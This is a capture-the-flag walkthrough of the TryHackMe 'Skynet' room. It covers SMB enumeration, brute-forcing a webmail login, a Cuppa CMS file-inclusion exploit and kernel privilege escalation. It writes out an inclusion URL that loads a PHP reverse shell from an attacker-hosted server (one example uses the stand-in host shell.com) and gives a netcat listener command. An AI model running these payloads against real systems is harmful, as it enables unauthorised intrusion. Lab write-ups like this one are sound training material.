---
description: https://tryhackme.com/room/skynet
---

# Skynet

## Nmap

```
nmap 10.10.244.119 -p- -A -T4

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP RESP-CODES SASL CAPA AUTH-RESP-CODE PIPELINING UIDL
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: IMAP4rev1 ID ENABLE LOGINDISABLEDA0001 SASL-IR LOGIN-REFERRALS capabilities have post-login listed OK Pre-login more LITERAL+ IDLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Task 1 #1**

![](<../../../.gitbook/assets/image (114) (1).png>)

We can begin by looking at our `nmap` results with the open samba shares. If we open up enum4linux and define the -a switch which stands for "Do all simple enumeration (-U -S -G -P -r -o -n -i)."

```
enum4linux -a <IP>
```

Using this we pull user and share information:

![Running enum4linix](<../../../.gitbook/assets/image (115) (1).png>)

We have a user account of milesdyson and we can now check some shares out. As we can see from the above output access is denied for the milesdyson share but, anonymous should be open for us.

We can use `smbclient` to connect.

![accessing the anonymous share on samba](<../../../.gitbook/assets/image (116).png>)

We can download any files with the get command. Grab the log files inside the logs directory. Log1.txt contains some potential passwords. For now we are finished with the Samba side of things.

We could now answer question #1 with the information that we have. Lets move onto the next interesting port and verify the answer to the quesiton.

## Port 80

Moving on over to port 80 we come to the following root directory.

![Webserver on port 80](<../../../.gitbook/assets/image (117) (1).png>)

I was not able to extract any interesting information from this page so I next turned to directory brute forcing.

We will be using gobuster as per below:

![Running gobuster on port 80](<../../../.gitbook/assets/image (118) (1).png>)

gobuster does not come preinstalled on Kali Linux so you will need to install with:

`sudo apt-get install gobuster`

the directory /squirrelmail/ is of interest. Once loaded we can put in the username we grabbed from our samba enumeration earlier.

Since we do not have many password to try we could manually try each password until we hit a valid result.

I will be using OWAS ZAP to fuzz for a valid response instead. I will not be detailing the process for setting up ZAP but you can find a great room on TryHackMe.com for setting up ZAP and a section on how to brute force web logins.

![https://tryhackme.com/room/learnowaspzap](<../../../.gitbook/assets/image (119) (1).png>)

The following results have been shortened but as you can see once the fuzz on the password has completed we can measure the response size field in order to determine a response that would indicate a correct password has been found. Looking at the "Size Resp. Body" Column we can determine this password is valid (this has been removed from the image as per THM writeup guidelines)

![Fuzzing with OWASP ZAP](<../../../.gitbook/assets/image (120) (1).png>)

After trying the username "milesdyson" which we found with `enum4linux` earlier on I added the password found above and was able to login to SquirrelMail.

![SquirrelMail](<../../../.gitbook/assets/image (121) (1).png>)

We can now use this to answer Task 1 #1

The latest email in the inbox looks interesting. When you open the email you should the samba password for milesdyson has been reset. Lets try `smbclient` again.

![milesdyson samba share on the server.](<../../../.gitbook/assets/image (123).png>)

Lets grab the important.txt file with the `get` command and take a look at the contents with the `cat` command.

![important.txt](<../../../.gitbook/assets/image (124) (1).png>)

Looking at number one this looks like a possible directory. Lets check it out.

![the directory /45kra24zxs28v3yd](<../../../.gitbook/assets/image (125) (1) (1).png>)

We can also use this information to answer question #2.

As the hidden directroy did not contain any interesting information we can return to gobuster and further enumerate.

![enumerating further with gobuster](<../../../.gitbook/assets/image (126) (1).png>)

We find the /administrator/ directory which takes us to the following webpage:

![Cuppa CMS /administrator/](<../../../.gitbook/assets/image (127) (1).png>)

I tried some of the milesdyson credentials we have gathered so far and was unable to login. I next turned to `searchsploit` to look for any known exploits:

![using seachsploit](<../../../.gitbook/assets/image (128).png>)

This takes us to the following exploit on exploit-db [https://www.exploit-db.com/exploits/25971](https://www.exploit-db.com/exploits/25971)

After reading through the exploit we have a few methods on how we can proceed. I will be using the local file inclusion to call a reverse PHP shell.

```
http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
```

Download the php file from the following URL: [https://pentestmonkey.net/tools/web-shells/php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

Put this in a directory and edit the variables in the script to point back to the attacking machine. Start a python server on the directory with:

```
python -m SimpleHTTPServer
```

After this edit the exploit LFI URI to include the remote machine IP and to include the hidden directory we found earlier. We then need to change the end of the URI to represent the python server on the attacking machine.

```
http://<IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<Attacking IP>:<port>/phpshell.php
```

{% hint style="info" %}
Unless specified Python will use port 8000 as the port.
{% endhint %}

Before executing the LFI we need to set up a netcat listener to catch the shell.

```
sudo nc -lvp 443
```

I use port 443 as its usually reliable for accepting inbound connections. You will need to use sudo to set this port as it is in the 1-1024 range. Once the listener is running attempt to browse to our exploit URI and we should get a shell.

![netcat](<../../../.gitbook/assets/image (129) (1).png>)

From here we can grab the user.txt flag

![Grabbing user.txt](<../../../.gitbook/assets/image (130).png>)

## Privilege escalation

From here we have a backups folder in milesdyson's home directory which has an interesting bash script which can be used for privilege escalation. We will be gaining root by a different method.

First of all I downloaded `Linuxexploitsuggester.sh` onto the victim machine and run it. We receive a few good probable exploits. The one we are interested in is CVE-2017-16995.

![](<../../../.gitbook/assets/image (131).png>)

Head over to exploited-db at the following link: [https://www.exploit-db.com/exploits/45010](https://www.exploit-db.com/exploits/45010)

Download the C code and upload it to the victim machine though the python SimpleHTTPServer which should still be running.

![Downloading the exploit](<../../../.gitbook/assets/image (132) (1).png>)

Now we need to compile the code. We have `gcc` installed on the machine and can use this to compile the exploit. Once compiled we need to ensure we can execute it by using `chmod +x`we can now run the exploit. I did not receive any confirmation once completed. We should have root after a short while. From here grab the root.txt flag from /root/root.txt

![Grabbing root.txt](<../../../.gitbook/assets/image (133) (1).png>)
